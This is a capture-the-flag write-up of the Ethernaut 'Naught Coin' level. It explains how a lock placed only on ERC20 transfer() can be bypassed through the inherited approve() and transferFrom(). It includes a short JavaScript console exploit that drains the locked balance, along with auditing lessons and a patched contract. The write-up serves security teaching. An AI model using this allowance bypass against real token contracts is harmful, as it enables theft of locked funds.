---
title: 'Ethernaut - Naught Coin'
description: 'Bypassing transfer locks by exploiting incomplete standard overrides. Learn how standard ERC20 token mechanics allow approve and transferFrom to circumvent direct transfer controls.'
date: 2025-07-15
tags: ['solidity', 'security', 'erc20', 'interface-override', 'ethernaut', 'ctf']
image: '../../../../public/ethernaut.png'
authors: ['thesandf']
---

# 🪙 Naught Coin - The Incomplete Standard Lock

## Challenge Overview

In this level, we are given **1,000,000 Naught Coins** (an ERC20 token). We are the owner of the supply, but the contract enforces a lock: we are prevented from transferring any tokens for **10 years**!

To beat the level, our objective is to **transfer all our tokens out of our account**, reducing our balance to 0.

---

## Technical Analysis

### Vulnerability: Incomplete Interface Override

The contract attempts to lock our tokens by adding a time-lock modifier `lockTokens` to the standard `transfer` function:

```solidity
contract NaughtCoin is ERC20 {
    // ...
    modifier lockTokens() {
        if (msg.sender == player) {
            require(block.timestamp > timeLock, "Tokens locked!");
        }
        _;
    }

    // [VULNERABILITY] Only transfer() is overridden and locked
    function transfer(address _to, uint256 _value) override public lockTokens returns(bool) {
        super.transfer(_to, _value);
    }
}
```

#### The Root Cause
The vulnerability lies in the incomplete implementation of the **ERC20 standard**:
1. **Two Ways to Transfer**: The ERC20 standard defines two distinct methods to transfer tokens:
   * **Direct**: `transfer(recipient, amount)` (called directly by the token holder).
   * **Delegated**: `approve(spender, amount)` followed by `transferFrom(sender, recipient, amount)` (called by a spender who has been granted an allowance).
2. **Incomplete Lock**: The `NaughtCoin` contract overrides and applies the `lockTokens` modifier **only to `transfer()`**.
3. **Open Spender Methods**: The standard `approve()` and `transferFrom()` functions are inherited directly from OpenZeppelin's `ERC20` contract and are **not** overridden or locked!

Because of this gap, we can approve another address (or a simple attacker contract) to spend our tokens, and then execute `transferFrom()` to transfer all tokens, bypassing the lock.

---

## The Exploit: The Multi-Step Solution

1. **Grant Allowance**: Call `approve(spender, 1000000)` from our player EOA, approving either an attacker contract or a secondary wallet address to spend our entire balance.
2. **Execute Delegated Transfer**: Call `transferFrom(player, recipient, 1000000)` from the authorized spender address.
3. **Lock Bypassed**: The tokens are successfully transferred out, and our balance falls to 0.

---

## Proof of Concept (PoC)

Below is the JavaScript console walkthrough (which does not require deploying an exploit contract):

```javascript
const playerAddress = player;
const spenderAddress = "0x0000000000000000000000000000000000000000"; // Replace with any secondary address
const amount = await contract.balanceOf(playerAddress);

// 1. Approve ourselves or a secondary address to spend our tokens
await contract.approve(playerAddress, amount);

// 2. Call transferFrom using the approved allowance
await contract.transferFrom(playerAddress, spenderAddress, amount);

// Verify our balance is now 0
const remainingBalance = await contract.balanceOf(playerAddress);
console.log("Remaining player balance:", remainingBalance.toString());
```

---

## Auditor's Lessons

1. **Audit the Entire Interface**: When enforcing access control or state locks on standard specifications (ERC20, ERC721, ERC1155), you must analyze and lock **all** functions that can modify that state.
2. **Inherited Function Risks**: Be extremely careful with inherited code. Untouched functions in parent contracts can bypass custom restrictions placed in child contracts.
3. **Write Comprehensive Integration Tests**: Ensure test suites cover all possible standard interaction pathways (such as delegated approvals) to verify that lock systems cannot be circumvented.

---

## Remediation

To secure the coin, override both `transfer` and `transferFrom` with the `lockTokens` modifier:

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "@openzeppelin/contracts/token/ERC20/ERC20.sol";

contract SecureNaughtCoin is ERC20 {
    address public player;
    uint256 public timeLock;

    constructor() ERC20("SecureNaughtCoin", "SNC") {
        player = msg.sender;
        timeLock = block.timestamp + 10 * 365 days;
        _mint(player, 1000000 * 10**decimals());
    }

    modifier lockTokens(address _from) {
        if (_from == player) {
            require(block.timestamp > timeLock, "Tokens locked!");
        }
        _;
    }

    // Lock direct transfers
    function transfer(address _to, uint256 _value) override public lockTokens(msg.sender) returns(bool) {
        return super.transfer(_to, _value);
    }

    // Lock delegated transfers
    function transferFrom(address _from, address _to, uint256 _value) override public lockTokens(_from) returns(bool) {
        return super.transferFrom(_from, _to, _value);
    }
}
```
